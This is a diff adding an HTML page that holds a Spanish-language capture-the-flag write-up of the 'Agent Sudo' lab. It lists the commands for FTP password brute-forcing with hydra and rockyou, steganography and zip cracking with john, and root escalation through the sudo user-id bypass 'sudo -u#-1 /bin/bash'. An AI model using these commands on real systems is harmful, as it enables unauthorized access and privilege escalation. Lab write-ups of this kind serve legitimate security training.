@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent Sudo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        h2 {
+            color: #0081ab;
+        }
+
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1>Agent Sudo</h1>
+
+        <h2>Nmap</h2>
+        <img src="image.png" alt="Nmap Scan">
+
+        <h2>Web</h2>
+        <img src="image-1.png" alt="Web Scan">
+        <p>Cambiamos el user agent a R</p>
+        <img src="image-2.png" alt="User Agent R">
+        <p>Cambiamos el user agent a C</p>
+        <img src="image-4.png" alt="User Agent C">
+
+        <h2>Fuzzing</h2>
+        <img src="image-3.png" alt="Fuzzing Result">
+
+        <h2>FTP</h2>
+        <pre><code>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.157.179</code></pre>
+        <img src="image-5.png" alt="Hydra FTP">
+        <p>Podemos descargar todos los archivos usando <code>mget *</code></p>
+        <img src="image-6.png" alt="FTP mget Command">
+        <img src="image-7.png" alt="FTP Files Downloaded">
+
+        <h2>Steg</h2>
+        <pre><code>exiftool cutie.png</code></pre>
+        <p>Podemos ver un Warning <code>Trailer data after PNG IEND chunk</code></p>
+        <img src="image-8.png" alt="Exiftool Warning">
+        <img src="image-9.png" alt="Exiftool Data">
+        <p>Extraemos el zip de la imagen</p>
+        <pre><code>binwalk cutie.png -e</code></pre>
+        <img src="image-10.png" alt="Binwalk Extraction">
+        <p>El archivo zip tiene contraseña, le pasamos <code>JohnTheRipper</code></p>
+        <pre><code>zip2john 8702.zip > zip.hashes
+john zip.hashes</code></pre>
+        <img src="image-11.png" alt="John The Ripper">
+        <p>Descomprimimos el zip</p>
+        <pre><code>7z e 8702.zip</code></pre>
+        <img src="image-12.png" alt="7z Extraction">
+        <p>Pasamos el mensaje oculto por <code>CyberChef</code></p>
+        <img src="image-13.png" alt="CyberChef">
+        <p>Extraemos el mensaje de la otra imagen</p>
+        <img src="image-14.png" alt="Image Message Extraction">
+        <img src="image-15.png" alt="Message Extracted">
+
+        <h2>SSH</h2>
+        <img src="image-16.png" alt="SSH Access">
+        <p>Descargamos la imagen</p>
+        <pre><code>sudo scp james@10.10.157.179:Alien_autospy.jpg ~/</code></pre>
+        <img src="image-17.png" alt="SCP Download">
+        <p>Buscamos la imagen en google. El nombre del incidente es <strong>Roswell alien autopsy</strong></p>
+
+        <h2>Escalada de Privilegios</h2>
+        <img src="image-18.png" alt="Privilege Escalation">
+        <p>Buscamos en google los permisos y encontramos como escalar</p>
+        <pre><code>sudo -u#-1 /bin/bash</code></pre>
+        <img src="image-19.png" alt="Sudo Escalation">
+        <img src="image-20.png" alt="Privileged Shell">
+    </div>
+</body>
+</html>
